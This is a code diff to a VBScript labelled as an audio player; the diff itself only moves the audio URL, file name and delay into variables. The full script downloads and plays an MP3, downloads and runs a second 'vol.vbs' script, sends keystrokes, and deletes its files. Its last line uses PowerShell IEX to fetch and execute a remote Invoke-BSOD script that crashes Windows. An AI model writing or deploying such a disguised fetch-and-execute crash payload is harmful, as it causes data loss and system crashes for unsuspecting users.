@@ -6,14 +6,17 @@ Set obj = CreateObject("Scripting.FileSystemObject")
 Set Keys = CreateObject("WScript.Shell")
 strScript = Wscript.ScriptFullName
 
-'delay in ms
-WScript.Sleep 5000
+SOUND_URL = "https://github.com/xcuzimfna/bubatz-audio-player/raw/files/example.mp3"
+AUDIO_FILE_NAME = "example.mp3"
+START_DELAY = "5000" 'in ms
+
+
+WScript.Sleep START_DELAY
 
 'download sound
-URL = "https://github.com/xcuzimfna/bubatz-audio-player/raw/files/example.mp3" '<--- AUDIO FILE URL
-objWinHttp.open "GET", URL, False
+objWinHttp.open "GET", SOUND_URL, False
 objWinHttp.send ""
-SaveBinaryData "example.mp3",objWinHttp.responseBody '<--- AUDIO FILE NAME
+SaveBinaryData AUDIO_FILE_NAME,objWinHttp.responseBody
 WScript.Sleep 500
 
 'download volume script
@@ -25,10 +28,10 @@ WScript.Sleep 500
 CreateObject("WScript.Shell").Run "vol.vbs"
 
 'audio player
-oPlayer.URL = "example.mp3" '<--- AUDIO FILE NAME
+oPlayer.URL = AUDIO_FILE_NAME
 oPlayer.controls.play 
 While oPlayer.playState <> 1
-  WScript.Sleep 16000 '<--- AUDIO DURATION IN MS
+  WScript.Sleep 1000
 Wend
 oPlayer.close
 
@@ -37,7 +40,7 @@ WScript.Sleep 500
 WshShell.SendKeys "github.com/xcuzimfna"
 
 'end
-obj.DeleteFile("example.mp3") '<-- AUDIO FILE NAME
+obj.DeleteFile(AUDIO_FILE_NAME)
 obj.DeleteFile("vol.vbs")
 WScript.Sleep 500
 CreateObject("WScript.Shell").Run "powershell IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD" 
